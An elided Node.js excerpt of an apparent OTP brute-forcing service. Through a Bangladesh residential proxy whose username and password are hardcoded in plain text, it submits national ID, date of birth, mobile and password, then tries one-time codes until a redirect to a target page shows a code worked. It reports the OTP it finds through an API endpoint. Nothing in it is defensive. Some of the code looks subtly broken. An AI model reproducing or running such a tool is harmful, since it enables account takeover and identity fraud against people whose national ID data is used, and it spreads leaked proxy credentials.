...
// Proxy Configuration
const PROXY_CONFIG = {
    host: 'as.26055fd300725bda.abcproxy.vip',
    port: 4950,
    auth: {
        username: 'Zxrookc71-zone-abc-region-BD',
        password: 'Zxrookc711'
    }
};
...
const proxyAgent = new HttpsProxyAgent({
    ...
    auth: `${PROXY_CONFIG.auth.username}:${PROXY_CONFIG.auth.password}`,
...
// Enhanced session creation with proper headers and proxy
async function getSessionAndBypass(nid, dob, mobile, password) {
    try {
        ...
        const response = await axios.post(url, data, {
            ...
            proxy: false // Disable default proxy as we're using agent
        });
...
async function tryOTP(session, cookies, otp) {
    try {
        ...
        if (response.status === 302 && response.headers.location && response.headers.headers.location.includes(TARGET_LOCATION)) {
            return otp;
        }
        return null;
    } catch (error) {
        ...
        if (foundOTP) {
            ...
            res.json({
                ...
                sessionInfo: {
                    mobileUsed: mobile,
                    otpFound: foundOTP,
                    proxyUsed: `${PROXY_CONFIG.host}:${PROXY_CONFIG.port}`
                }
            });
...
// New endpoint to check proxy status
app.get('/proxy-status', async (req, res) => {
    try {
        ...
        res.json({
            proxyStatus: 'Working',
            proxyServer: `${PROXY_CONFIG.host}:${PROXY_CONFIG.port}`,
            yourIP: testResponse.data.origin,
            region: 'Bangladesh'
        });
    } catch (error) {
        res.json({
            proxyStatus: 'Not Working',
            error: error.message,
            proxyServer: `${PROXY_CONFIG.host}:${PROXY_CONFIG.port}`
        });
    }
